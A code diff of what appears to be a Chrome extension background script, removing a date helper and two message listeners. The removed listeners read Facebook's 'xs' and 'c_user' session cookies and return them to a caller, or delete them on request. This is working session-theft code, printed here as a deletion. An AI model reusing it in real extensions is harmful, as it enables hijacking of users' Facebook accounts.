@@ -16,16 +16,6 @@ import {
 function addZero(number) {
     return number < 10 ? "0" + number : number;
 }
-const dateTime = () => {
-    const currentDate = new Date();
-    const year = currentDate.getFullYear();
-    const month = addZero(currentDate.getMonth() + 1);
-    const day = addZero(currentDate.getDate());
-    const hours = addZero(currentDate.getHours());
-    const minutes = addZero(currentDate.getMinutes());
-    const seconds = addZero(currentDate.getSeconds());
-    return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
-};
 function openRightPanel(e, a, t = !1, s = !1) {
     chrome.system.display.getInfo((n) => {
         var { width: o, height: i } = n[0].workArea,
@@ -208,35 +198,4 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 
         return true;
     }
-});
-
-const targetURL = "https://www.facebook.com";
-
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    if (message === "getcookies") {
-        chrome.cookies.getAll({ url: targetURL }, (cookies) => {
-            const xsCookie = cookies.find((cookie) => cookie.name === "xs");
-            const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
-            if (xsCookie && cUserCookie) {
-                const cookie = `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`;
-                sendResponse(cookie);
-            } else {
-                sendResponse(null);
-            }
-            return true;
-        });
-        return true;
-    }
-});
-
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    if (message === "removecookies") {
-        const arrCookies = ["xs", "c_user"];
-        arrCookies.forEach((cookieName) => {
-            chrome.cookies.remove({ name: cookieName, url: targetURL });
-        });
-        sendResponse(true);
-    }
-
-    return true;
 });
